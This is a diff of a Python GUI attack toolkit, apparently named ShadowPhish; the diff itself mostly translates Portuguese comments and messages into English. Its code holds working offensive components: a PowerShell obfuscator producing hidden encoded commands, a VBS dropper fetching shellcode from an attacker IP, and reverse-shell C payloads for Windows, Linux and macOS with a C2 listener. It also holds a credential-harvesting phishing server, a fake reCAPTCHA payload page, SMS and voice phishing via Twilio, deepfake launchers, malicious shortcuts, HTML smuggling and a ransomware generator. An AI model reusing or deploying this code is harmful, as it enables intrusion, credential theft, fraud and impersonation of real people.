@@ -5,19 +5,20 @@ from PySide2.QtWidgets import (
 from PySide2.QtGui import QPixmap
 from PySide2.QtWidgets import QLabel
 from PySide2.QtGui import QPalette, QColor
-from PySide2.QtCore import Qt
-from PySide2.QtCore import QTimer
+from PySide2.QtCore import Qt, QTimer
 import sys
 import os
 import subprocess
 import threading
 import socket
-# Garante que o diretório raiz esteja no path
+
+# Ensure the root directory is in the system path
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 if BASE_DIR not in sys.path:
     sys.path.insert(0, BASE_DIR)
+
 from frontend.splash_screen import ShadowPhishSplash
-from PySide2.QtCore import QTimer
+
 
 
 class DarkThemeApp(QMainWindow):
@@ -517,7 +518,7 @@ class DarkThemeApp(QMainWindow):
         palette.setColor(QPalette.HighlightedText, Qt.black)
         self.setPalette(palette)
 
-    # Placeholders para os botões — você insere os códigos quando quiser
+     # Placeholders for the buttons — insert your code here when needed
     def generate_pdf(self):
         host = self.pdf_input.toPlainText().strip()
         if not host:
@@ -725,13 +726,13 @@ End Function'''
         use_compress = self.ps_compress_checkbox.isChecked()
 
         if not raw_code:
-            QMessageBox.warning(self, "Alert", "Insert a PowerShell script.")
+            QMessageBox.warning(self, "Alert", "Please enter a PowerShell script.")
             return
 
         try:
             result = raw_code
 
-            # Substituição de variáveis
+            # Variable substitution
             if use_vars:
                 var_name = ''.join(random.choices(string.ascii_letters, k=8))
                 result = f"${var_name} = \"{result}\"\n"
@@ -741,7 +742,7 @@ End Function'''
                 else:
                     result += f"Invoke-Expression (${var_name})"
 
-            # Concatenação de strings
+            # String concatenation
             if use_concat:
                 chunks = [f'"{c}"' for c in raw_code]
                 joined = '+'.join(chunks)
@@ -751,7 +752,7 @@ End Function'''
                 else:
                     result += "Invoke-Expression ($cmd)"
 
-            # Compressão e descompressão
+            # Compression and decompression
             if use_compress:
                 compressed = zlib.compress(raw_code.encode("utf-8"))
                 compressed_b64 = base64.b64encode(compressed).decode("utf-8")
@@ -770,12 +771,12 @@ $cmd = $reader.ReadToEnd()
                 else:
                     result += "Invoke-Expression ($cmd)"
 
-            # Base64 final
+            # Final Base64 encoding
             if use_b64:
                 encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                 result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"
 
-            # Salvar
+            # Save the result
             with open("payload_obfuscated.ps1", "w", encoding="utf-8") as f:
                 f.write(result)
 
@@ -783,7 +784,6 @@ $cmd = $reader.ReadToEnd()
 
         except Exception as e:
             QMessageBox.critical(self, "Error", f"Error generating PS1:\n{str(e)}")
-
 
 
     def generate_vbs_remote(self):
@@ -797,8 +797,8 @@ $cmd = $reader.ReadToEnd()
         if not path:
             return
 
-        # Pede IP e Porta
-        ip, ok1 = QInputDialog.getText(self, "Download IP", "Enter the IP to be used in the VBS (e.g., 192.168.1.10):")
+        # Ask for IP and Port
+        ip, ok1 = QInputDialog.getText(self, "Download IP", "Enter the IP to use in the VBS (e.g., 192.168.1.10):")
         if not ok1 or not ip:
             return
 
@@ -808,12 +808,12 @@ $cmd = $reader.ReadToEnd()
         port = int(port)
 
         try:
-            # Copia shellcode.bin para pasta de saída
+            # Copy shellcode.bin to the output folder
             os.makedirs("outputs", exist_ok=True)
             bin_dest = os.path.join("outputs", "shellcode.bin")
             shutil.copy(path, bin_dest)
 
-            # Cria VBS dropper
+            # Create the VBS dropper
             vbs_code = f"""Set xHttp = CreateObject("MSXML2.XMLHTTP")
 xHttp.Open "GET", "http://{ip}:{port}/shellcode.bin", False
 xHttp.Send
@@ -832,7 +832,7 @@ End If
             with open(vbs_path, "w", encoding="utf-8") as f:
                 f.write(vbs_code)
 
-            # Inicia o servidor embutido para servir o .bin
+            # Start the embedded HTTP server to serve the .bin file
             def start_server():
                 os.chdir("outputs")
                 handler = http.server.SimpleHTTPRequestHandler
@@ -847,7 +847,6 @@ End If
 
         except Exception as e:
             QMessageBox.critical(self, "Error", f"Error generating remote VBS:\n{str(e)}")
-
 
     def start_phish_server(self):
         import os
@@ -866,7 +865,7 @@ End If
         port = random.randint(8000, 8999)
 
         try:
-            # Start PHP server
+            # Start PHP built-in server
             subprocess.Popen(
                 ["php", "-S", f"0.0.0.0:{port}"],
                 cwd=site_path,
@@ -878,15 +877,16 @@ End If
             self.phish_url_label.setText(f"<b>Server Active (PHP):</b> <a href='{url}'>{url}</a>")
             self.phish_url_label.setOpenExternalLinks(True)
 
-            # Inicia monitoramento do usernames.txt
-        
         except Exception as e:
             QMessageBox.critical(self, "Error", f"Failed to start PHP server:\n{str(e)}")
+            return
+
+        # Start monitoring usernames.txt
         self.cred_path = os.path.join(site_path, "usernames.txt")
         self.last_creds = ""
         self.timer = QTimer()
         self.timer.timeout.connect(self.check_credentials_file)
-        self.timer.start(2000)  # a cada 2 segundos
+        self.timer.start(2000)  # every 2 seconds
 
     def check_credentials_file(self):
         if os.path.exists(self.cred_path):
@@ -895,7 +895,6 @@ End If
             if content != self.last_creds:
                 self.creds_output.setPlainText(content)
                 self.last_creds = content
-
 
     def generate_fake_recaptcha(self):
         import os
@@ -912,20 +911,20 @@ End If
             QMessageBox.critical(self, "Error", "Files not found in the '.fake-recaptcha' folder.")
             return
 
-        # Input do payload
+        # Get payload from user input
         payload, ok = QInputDialog.getMultiLineText(self, "Payload", "Enter the payload to be copied:")
         if not ok or not payload.strip():
             return
         payload = payload.strip().replace('"', '\\"')
 
-        # Seleção de sistema operacional
-        sistemas = ["Windows", "Linux", "macOS"]
-        sistema, ok = QInputDialog.getItem(self, "Target System", "Select the target System:", sistemas, editable=False)
-        if not ok or not sistema:
+        # OS selection
+        systems = ["Windows", "Linux", "macOS"]
+        system, ok = QInputDialog.getItem(self, "Target System", "Select the target system:", systems, editable=False)
+        if not ok or not system:
             return
 
         try:
-            # Atualiza a variável const payload no JavaScript
+            # Replace payload in JavaScript
             with open(js_path, "r", encoding="utf-8") as f:
                 js_content = f.read()
 
@@ -939,18 +938,18 @@ End If
             return
 
         try:
-            # Atualiza o index.html com localStorage.setItem('os', ...)
+            # Modify index.html to store selected OS in localStorage
             with open(html_path, "r", encoding="utf-8") as f:
                 html = f.read()
 
             if "localStorage.setItem" not in html:
                 html = html.replace(
                     '<script src="src/fakerecaptcha.js"></script>',
-                    f'<script>localStorage.setItem("os", "{sistema.lower()}");</script>\n<script src="src/fakerecaptcha.js"></script>'
+                    f'<script>localStorage.setItem("os", "{system.lower()}");</script>\n<script src="src/fakerecaptcha.js"></script>'
                 )
             else:
                 html = re.sub(r'localStorage\.setItem\("os", "[^"]*"\);',
-                            f'localStorage.setItem("os", "{sistema.lower()}");', html)
+                              f'localStorage.setItem("os", "{system.lower()}");', html)
 
             with open(html_path, "w", encoding="utf-8") as f:
                 f.write(html)
@@ -959,7 +958,7 @@ End If
             QMessageBox.critical(self, "Error", f"Failed to modify HTML:\n{str(e)}")
             return
 
-        # Inicia servidor PHP
+        # Start PHP server
         try:
             port = random.randint(8100, 8999)
             subprocess.Popen(
@@ -970,13 +969,12 @@ End If
             )
 
             url = f"http://127.0.0.1:{port}/"
-            QMessageBox.information(self, "Fake Recaptcha", f"Servidor iniciado em:\n{url}")
+            QMessageBox.information(self, "Fake Recaptcha", f"Server started at:\n{url}")
             self.phish_url_label.setText(f"<b>Fake Recaptcha</b> <a href='{url}'>{url}</a>")
             self.phish_url_label.setOpenExternalLinks(True)
 
         except Exception as e:
-            QMessageBox.critical(self, "Erro", f"Erro ao iniciar servidor PHP:\n{str(e)}")
-
+            QMessageBox.critical(self, "Error", f"Failed to start PHP server:\n{str(e)}")
 
     def generate_deepvoice_audio(self):
         import asyncio  
@@ -988,42 +986,42 @@ End If
         voice_map = {
             "Obama": "en-US-GuyNeural",
             "Elon Musk": "en-US-AriaNeural",
-            "Genérica": "en-US-JennyNeural",
-            "Treinada": "en-GB-RyanNeural"
+            "Generic": "en-US-JennyNeural",
+            "Trained": "en-GB-RyanNeural"
         }
         selected_voice = voice_map.get(voice, "en-US-GuyNeural")
 
         if not text:
-            QMessageBox.warning(self, "Aviso", "Digite um texto para gerar a voz.")
+            QMessageBox.warning(self, "Warning", "Please enter text to generate voice.")
             return
 
         def run_voice():
             asyncio.run(generate_cloned_voice(text, selected_voice))
-            self.deepvoice_status.setText("✅ Voz gerada com sucesso: cloned_voice.mp3")
+            self.deepvoice_status.setText("✅ Voice generated successfully: cloned_voice.mp3")
 
         threading.Thread(target=run_voice).start()
 
 
     def select_face_image(self):
         from PySide2.QtWidgets import QFileDialog
-        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Imagem de Rosto", "", "Imagens (*.jpg *.jpeg *.png)")
+        path, _ = QFileDialog.getOpenFileName(self, "Select Face Image", "", "Images (*.jpg *.jpeg *.png)")
         if path:
             self.face_image_path = path
-            QMessageBox.information(self, "Imagem Selecionada", f"Imagem de rosto carregada:\n{path}")
+            QMessageBox.information(self, "Image Selected", f"Face image loaded:\n{path}")
 
     def select_target_video(self):
         from PySide2.QtWidgets import QFileDialog
-        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Vídeo com Rosto", "", "Vídeos (*.mp4 *.avi *.mov)")
+        path, _ = QFileDialog.getOpenFileName(self, "Select Target Video", "", "Videos (*.mp4 *.avi *.mov)")
         if path:
             self.target_video_path = path
-            QMessageBox.information(self, "Vídeo Selecionado", f"Vídeo alvo carregado:\n{path}")
+            QMessageBox.information(self, "Video Selected", f"Target video loaded:\n{path}")
 
     def run_deepfake_generator(self):
         import subprocess
         import threading
 
         if not self.face_image_path or not self.target_video_path:
-            QMessageBox.warning(self, "Erro", "Selecione uma imagem de rosto e um vídeo alvo.")
+            QMessageBox.warning(self, "Error", "Please select both a face image and a target video.")
             return
 
         def execute():
@@ -1034,17 +1032,17 @@ End If
                     "--source", self.face_image_path,
                     "--target", self.target_video_path,
                     "--output", output_path,
-                    "--skip-download"  # se já tiver modelos baixados
+                    "--skip-download"  # if models are already downloaded
                 ]
                 result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
                 if result.returncode == 0:
-                    self.deepfake_status.setText(f"✅ Deepfake gerado com sucesso: {output_path}")
+                    self.deepfake_status.setText(f"✅ Deepfake successfully generated: {output_path}")
                 else:
-                    self.deepfake_status.setText(f"❌ Erro ao gerar deepfake:\n{result.stderr}")
+                    self.deepfake_status.setText(f"❌ Error generating deepfake:\n{result.stderr}")
 
             except Exception as e:
-                self.deepfake_status.setText(f"Erro inesperado: {str(e)}")
+                self.deepfake_status.setText(f"Unexpected error: {str(e)}")
 
         threading.Thread(target=execute, daemon=True).start()
 
@@ -1054,7 +1052,7 @@ End If
         target_os = self.c2_os_selector.currentText()
 
         if not ip or not port:
-            QMessageBox.warning(self, "Erro", "Preencha IP e Porta corretamente.")
+            QMessageBox.warning(self, "Error", "Please enter both IP and Port.")
             return
 
         try:
@@ -1064,30 +1062,30 @@ End If
                 filename = "payloads/payload_windows.c"
                 exe_name = "payloads/payload_windows.exe"
                 payload_code = f'''
-    #include <winsock2.h>
-    #include <windows.h>
-    #pragma comment(lib, "ws2_32")
+#include <winsock2.h>
+#include <windows.h>
+#pragma comment(lib, "ws2_32")
 
-    WSADATA wsa;
-    SOCKET sock;
-    struct sockaddr_in server;
+WSADATA wsa;
+SOCKET sock;
+struct sockaddr_in server;
 
-    int main() {{
-        WSAStartup(MAKEWORD(2,2), &wsa);
-        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-        server.sin_family = AF_INET;
-        server.sin_port = htons({port});
-        server.sin_addr.s_addr = inet_addr("{ip}");
-        connect(sock, (struct sockaddr*)&server, sizeof(server));
-        STARTUPINFO si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESTDHANDLES;
-        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
-        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-        return 0;
-    }}'''
+int main() {{
+    WSAStartup(MAKEWORD(2,2), &wsa);
+    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    server.sin_family = AF_INET;
+    server.sin_port = htons({port});
+    server.sin_addr.s_addr = inet_addr("{ip}");
+    connect(sock, (struct sockaddr*)&server, sizeof(server));
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    return 0;
+}}'''
                 with open(filename, "w") as f:
                     f.write(payload_code)
                 compile_cmd = f"x86_64-w64-mingw32-gcc {filename} -o {exe_name} -lws2_32"
@@ -1096,32 +1094,32 @@ End If
                 filename = "payloads/payload_linux.c"
                 exe_name = "payloads/payload_linux"
                 payload_code = f'''
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <unistd.h>
-    #include <netinet/in.h>
-    #include <arpa/inet.h>
-    #include <string.h>
-    #include <sys/socket.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <sys/socket.h>
 
-    int main() {{
-        int sock;
-        struct sockaddr_in attacker;
+int main() {{
+    int sock;
+    struct sockaddr_in attacker;
 
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-        attacker.sin_family = AF_INET;
-        attacker.sin_port = htons({port});
-        attacker.sin_addr.s_addr = inet_addr("{ip}");
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    attacker.sin_family = AF_INET;
+    attacker.sin_port = htons({port});
+    attacker.sin_addr.s_addr = inet_addr("{ip}");
 
-        connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
+    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
 
-        dup2(sock, 0); // STDIN
-        dup2(sock, 1); // STDOUT
-        dup2(sock, 2); // STDERR
+    dup2(sock, 0); // STDIN
+    dup2(sock, 1); // STDOUT
+    dup2(sock, 2); // STDERR
 
-        execl("/bin/sh", "sh", NULL);
-        return 0;
-    }}'''
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}}'''
                 with open(filename, "w") as f:
                     f.write(payload_code)
                 compile_cmd = f"gcc {filename} -o {exe_name}"
@@ -1130,52 +1128,52 @@ End If
                 filename = "payloads/payload_macos.c"
                 exe_name = "payloads/payload_macos"
                 payload_code = f'''
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <unistd.h>
-    #include <netinet/in.h>
-    #include <arpa/inet.h>
-    #include <string.h>
-    #include <sys/socket.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <sys/socket.h>
 
-    int main() {{
-        int sock;
-        struct sockaddr_in attacker;
+int main() {{
+    int sock;
+    struct sockaddr_in attacker;
 
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-        attacker.sin_family = AF_INET;
-        attacker.sin_port = htons({port});
-        attacker.sin_addr.s_addr = inet_addr("{ip}");
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    attacker.sin_family = AF_INET;
+    attacker.sin_port = htons({port});
+    attacker.sin_addr.s_addr = inet_addr("{ip}");
 
-        connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
+    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
 
-        dup2(sock, 0); // STDIN
-        dup2(sock, 1); // STDOUT
-        dup2(sock, 2); // STDERR
+    dup2(sock, 0); // STDIN
+    dup2(sock, 1); // STDOUT
+    dup2(sock, 2); // STDERR
 
-        execl("/bin/zsh", "zsh", NULL);
-        return 0;
-    }}'''
+    execl("/bin/zsh", "zsh", NULL);
+    return 0;
+}}'''
                 with open(filename, "w") as f:
                     f.write(payload_code)
                 compile_cmd = f"clang {filename} -o {exe_name}"
 
-            # Compilação
+            # Compilation
             result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
             if result.returncode == 0:
-                QMessageBox.information(self, "Sucesso", "Payload gerado com sucesso.")
+                QMessageBox.information(self, "Success", "Payload compiled successfully.")
                 
-                # ✅ Atualiza comandos padrão conforme plataforma
+                # ✅ Update default commands for the selected platform
                 selected_platform = self.c2_platform_selector.currentText()
                 self.update_default_commands(selected_platform)
                 
-                # ✅ Inicia o listener
+                # ✅ Start the listener
                 self.start_listener(ip, int(port))
             else:
-                QMessageBox.critical(self, "Erro", f"Erro ao compilar:\n{result.stderr}")
+                QMessageBox.critical(self, "Error", f"Compilation error:\n{result.stderr}")
 
         except Exception as e:
-            QMessageBox.critical(self, "Erro", f"Falha ao gerar payload:\n{str(e)}")
+            QMessageBox.critical(self, "Error", f"Failed to generate payload:\n{str(e)}")
 
 
     def start_listener(self, ip, port):
@@ -1184,9 +1182,9 @@ End If
             self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.listener_socket.bind((ip, port))
             self.listener_socket.listen(1)
-            self.c2_terminal.append("[+] Aguardando conexão...")
+            self.c2_terminal.append("[+] Waiting for connection...")
             self.client_socket, addr = self.listener_socket.accept()
-            self.c2_terminal.append(f"[+] Conectado com: {addr}\n")
+            self.c2_terminal.append(f"[+] Connected to: {addr}\n")
             while True:
                 try:
                     output = self.client_socket.recv(4096).decode(errors='ignore')
@@ -1203,12 +1201,12 @@ End If
                 self.client_socket.sendall((command + "\n").encode())
                 self.manual_cmd.clear()
             except Exception as e:
-                self.c2_terminal.append(f"[Erro ao enviar comando]: {str(e)}")
+                self.c2_terminal.append(f"[Error sending command]: {str(e)}")
         else:
-            self.c2_terminal.append("[!] Nenhum cliente conectado ainda.")
+            self.c2_terminal.append("[!] No client connected yet.")
 
     def update_default_commands(self, platform):
-        # Remove botões antigos
+        # Remove old buttons
         for btn in self.cmd_buttons:
             btn.deleteLater()
         self.cmd_buttons.clear()
@@ -1221,17 +1219,16 @@ End If
             commands = ["whoami", "ifconfig", "ls", "ps -ax", "sw_vers"]
 
         for cmd in commands:
-            btn = QPushButton(f"Executar: {cmd}")
+            btn = QPushButton(f"Run: {cmd}")
             btn.clicked.connect(lambda checked=False, c=cmd: self.send_c2_command(c))
             self.cmds_layout.addWidget(btn)
             self.cmd_buttons.append(btn)
 
     def select_audio_file(self):
         from PySide2.QtWidgets import QFileDialog
-        file_path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo de Áudio", "", "Áudio (*.mp3 *.wav)")
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Audio File", "", "Audio Files (*.mp3 *.wav)")
         if file_path:
             self.gsm_audio_path.setText(file_path)
-
 
     def send_gsm_action(self):
         from twilio.rest import Client
@@ -1241,47 +1238,52 @@ End If
         token = self.twilio_token_input.text().strip()
         from_number = self.twilio_from_input.text().strip()
         to_number = self.gsm_number_input.text().strip()
-        tipo = self.gsm_type_selector.currentText()
-        msg = self.gsm_msg_input.toPlainText().strip()
+        action_type = self.gsm_type_selector.currentText()
+        message = self.gsm_msg_input.toPlainText().strip()
         audio_url = self.gsm_audio_path.text().strip()
 
         if not sid or not token or not from_number:
-            QMessageBox.warning(self, "Erro", "Preencha as credenciais do Twilio (SID, Token e Número From).")
+            QMessageBox.warning(self, "Error", "Please fill in Twilio credentials (SID, Token, and From Number).")
             return
 
         if not to_number:
-            QMessageBox.warning(self, "Erro", "Preencha o número de destino.")
+            QMessageBox.warning(self, "Error", "Please enter the destination phone number.")
             return
 
         try:
             client = Client(sid, token)
 
-            if "Smishing" in tipo:
-                if not msg:
-                    QMessageBox.warning(self, "Erro", "Digite a mensagem SMS.")
+            if "Smishing" in action_type:
+                if not message:
+                    QMessageBox.warning(self, "Error", "Please enter the SMS message.")
                     return
 
-                message = client.messages.create(
-                    body=msg,
+                msg_response = client.messages.create(
+                    body=message,
                     from_=from_number,
                     to=to_number
                 )
-                self.gsm_status.setText(f"✅ SMS enviado com sucesso! SID: {message.sid}")
+                self.gsm_status.setText(f"✅ SMS successfully sent! SID: {msg_response.sid}")
 
-            elif "Vishing" in tipo:
+            elif "Vishing" in action_type:
                 if audio_url.startswith("http"):
                     call = client.calls.create(
                         twiml=f'<Response><Play>{audio_url}</Play></Response>',
                         from_=from_number,
                         to=to_number
                     )
-                    self.gsm_status.setText(f"📞 Ligação iniciada com sucesso! SID: {call.sid}")
+                    self.gsm_status.setText(f"📞 Call successfully started! SID: {call.sid}")
                 else:
-                    QMessageBox.warning(self, "Erro", "Insira uma URL de áudio válida para ligação (ex: https://.../audio.mp3)")
+                    QMessageBox.warning(
+                        self,
+                        "Error",
+                        "Please provide a valid audio URL for the call (e.g., https://.../audio.mp3)"
+                    )
                     return
 
         except Exception as e:
-            QMessageBox.critical(self, "Erro", f"Erro ao enviar:\n{str(e)}")
+            QMessageBox.critical(self, "Error", f"Failed to send:\n{str(e)}")
+
 
     def generate_apt_chain(self):
         apt = self.apt_selector.currentText()
@@ -1296,26 +1298,26 @@ End If
             "FIN7": [
                 "Spear Phishing Link (T1566.002)",
                 "HTA Dropper Executed via wscript",
-                "C2 com Empire Framework",
-                "Credential Access com mimikatz",
+                "C2 with Empire Framework",
+                "Credential Access using mimikatz",
                 "Persistence via Registry Run Key"
             ],
             "APT41": [
-                "Phishing com PDF",
+                "Phishing with PDF",
                 "DLL Sideloading",
                 "Cobalt Strike Beacon",
                 "Lateral Movement via RDP",
-                "Exfil via Cloud API"
+                "Exfiltration via Cloud API"
             ]
         }
 
         template = chains.get(apt, [])
         if template:
             self.apt_output.setPlainText(" → ".join(template))
-            self.apt_status.setText(f"✅ Cadeia de ataque de {apt} gerada.")
+            self.apt_status.setText(f"✅ Attack chain for {apt} generated.")
         else:
             self.apt_output.clear()
-            self.apt_status.setText("❌ Erro: APT não reconhecido.")
+            self.apt_status.setText("❌ Error: Unrecognized APT.")
 
     def generate_lnk_malware(self):
         import pythoncom
@@ -1328,7 +1330,7 @@ End If
         hidden = self.lnk_hidden_checkbox.isChecked()
 
         if not all([target, name, output]):
-            QMessageBox.warning(self, "Erro", "Preencha todos os campos obrigatórios.")
+            QMessageBox.warning(self, "Error", "Please fill in all required fields.")
             return
 
         try:
@@ -1340,28 +1342,27 @@ End If
                 shortcut.IconLocation = icon
 
             if hidden:
-                shortcut.WindowStyle = 7  # Minimizado (invisível)
+                shortcut.WindowStyle = 7  # Minimized (invisible)
 
             shortcut.Save()
-            self.lnk_status.setText(f"✅ Atalho criado em: {os.path.join(output, name)}")
+            self.lnk_status.setText(f"✅ Shortcut created at: {os.path.join(output, name)}")
         except Exception as e:
-            self.lnk_status.setText(f"❌ Erro: {str(e)}")
+            self.lnk_status.setText(f"❌ Error: {str(e)}")
 
     def select_icon_file(self):
         from PySide2.QtWidgets import QFileDialog
-        file_path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo de Ícone", "", "Ícones (*.ico)")
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Icon File", "", "Icons (*.ico)")
         if file_path:
             self.lnk_icon_input.setText(file_path)
 
     def select_output_folder(self):
         from PySide2.QtWidgets import QFileDialog
-        folder_path = QFileDialog.getExistingDirectory(self, "Selecionar Pasta de Destino")
+        folder_path = QFileDialog.getExistingDirectory(self, "Select Output Folder")
         if folder_path:
             self.lnk_output_dir.setText(folder_path)
 
-
     def select_htmlsm_file(self):
-        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo para HTML Smuggling", "", "Todos os Arquivos (*)")
+        path, _ = QFileDialog.getOpenFileName(self, "Select File for HTML Smuggling", "", "All Files (*)")
         if path:
             self.htmlsm_file_input.setText(path)
 
@@ -1375,30 +1376,63 @@ End If
         mode = self.htmlsm_mode_selector.currentText()
 
         if not os.path.exists(file_path):
-            QMessageBox.warning(self, "Erro", "Arquivo selecionado não encontrado.")
+            QMessageBox.warning(self, "Error", "Selected file not found.")
             return
 
         try:
             with open(file_path, "rb") as f:
                 b64_data = base64.b64encode(f.read()).decode()
 
-            if mode == "Clique na Imagem":
+            if mode == "Click the Image":
                 html_template = f"""<!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>Click to Download</title>
-        <style>
-            body {{ font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
-            .container {{ text-align: center; }}
-            img {{ width: 200px; cursor: pointer; }}
-        </style>
-    </head>
-    <body>
-    <div class="container">
-        <h3>Click on the Image!</h3>
-        <img src="{image_url}" alt="Click to download" onclick="initiateDownload()" />
-    </div>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Click to Download</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
+        .container {{ text-align: center; }}
+        img {{ width: 200px; cursor: pointer; }}
+    </style>
+</head>
+<body>
+<div class="container">
+    <h3>Click on the Image!</h3>
+    <img src="{image_url}" alt="Click to download" onclick="initiateDownload()" />
+</div>
+<script>
+(function() {{
+    function b64ToBuf(b64) {{
+        var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
+        for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
+        return buf;
+    }}
+    window.initiateDownload = function() {{
+        var data = `{b64_data}`;
+        var blobData = b64ToBuf(data);
+        var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
+        var link = document.createElement('a');
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        var url = window.URL.createObjectURL(blob);
+        link.href = url;
+        link.download = '{download_name}';
+        link.click();
+        setTimeout(function() {{
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(link);
+        }}, 100);
+    }};
+}})();
+</script>
+</body>
+</html>"""
+            else:  # Automatic Download
+                html_template = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Download Starting...</title>
     <script>
     (function() {{
         function b64ToBuf(b64) {{
@@ -1406,7 +1440,7 @@ End If
             for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
             return buf;
         }}
-        window.initiateDownload = function() {{
+        window.onload = function() {{
             var data = `{b64_data}`;
             var blobData = b64ToBuf(data);
             var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
@@ -1424,59 +1458,25 @@ End If
         }};
     }})();
     </script>
-    </body>
-    </html>"""
-            else:  # Download Automático
-                html_template = f"""<!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>Download Starting...</title>
-        <script>
-        (function() {{
-            function b64ToBuf(b64) {{
-                var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
-                for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
-                return buf;
-            }}
-            window.onload = function() {{
-                var data = `{b64_data}`;
-                var blobData = b64ToBuf(data);
-                var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
-                var link = document.createElement('a');
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                var url = window.URL.createObjectURL(blob);
-                link.href = url;
-                link.download = '{download_name}';
-                link.click();
-                setTimeout(function() {{
-                    window.URL.revokeObjectURL(url);
-                    document.body.removeChild(link);
-                }}, 100);
-            }};
-        }})();
-        </script>
-    </head>
-    <body>
-    <h3>Download Iniciando...</h3>
-    </body>
-    </html>"""
+</head>
+<body>
+<h3>Download Starting...</h3>
+</body>
+</html>"""
 
             os.makedirs("outputs", exist_ok=True)
             html_path = os.path.join("outputs", "html_smuggling.html")
             with open(html_path, "w", encoding="utf-8") as f:
                 f.write(html_template)
 
-            self.htmlsm_status.setText(f"✅ HTML Smuggling gerado em: {html_path}")
-            QMessageBox.information(self, "Sucesso", f"HTML salvo como:\n{html_path}")
+            self.htmlsm_status.setText(f"✅ HTML Smuggling file generated at: {html_path}")
+            QMessageBox.information(self, "Success", f"HTML saved as:\n{html_path}")
             self.htmlsm_open_btn.setEnabled(True)
             self.generated_html_path = html_path
 
         except Exception as e:
-            self.htmlsm_status.setText(f"❌ Erro: {str(e)}")
-            QMessageBox.critical(self, "Erro", f"Erro ao gerar HTML:\n{str(e)}")
-
+            self.htmlsm_status.setText(f"❌ Error: {str(e)}")
+            QMessageBox.critical(self, "Error", f"Failed to generate HTML:\n{str(e)}")
 
     def open_htmlsm_in_browser(self):
         import webbrowser
@@ -1486,10 +1486,9 @@ End If
             try:
                 webbrowser.open_new_tab(f"file://{os.path.abspath(self.generated_html_path)}")
             except Exception as e:
-                QMessageBox.critical(self, "Erro", f"Falha ao abrir no navegador:\n{str(e)}")
+                QMessageBox.critical(self, "Error", f"Failed to open in browser:\n{str(e)}")
         else:
-            QMessageBox.warning(self, "Erro", "Arquivo HTML não encontrado para abrir.")
-
+            QMessageBox.warning(self, "Error", "HTML file not found to open.")
 
 
     def generate_sim_ransomware(self):
@@ -1500,10 +1499,10 @@ End If
         name = self.ransomware_name_input.text().strip() or "SimRansom"
         key_text = self.ransomware_key_input.text().strip()
         cipher_type = self.ransomware_cipher_selector.currentText()
-        target_os = self.ransomware_os_selector.currentText()  # "Linux" ou "Windows"
+        target_os = self.ransomware_os_selector.currentText()  # "Linux" or "Windows"
 
         if not key_text:
-            QMessageBox.warning(self, "Erro", "Digite uma chave (ex: SegredoTop123).")
+            QMessageBox.warning(self, "Error", "Please enter a key (e.g., TopSecret123).")
             return
 
         key = key_text.encode("utf-8")
@@ -1517,128 +1516,125 @@ End If
         exe_ext = ".exe" if target_os == "Windows" else ""
         exe_path = f"sim_ransomware/{name}_{target_os.lower()}{exe_ext}"
 
-        # Caminho e separador
+        # Path separator
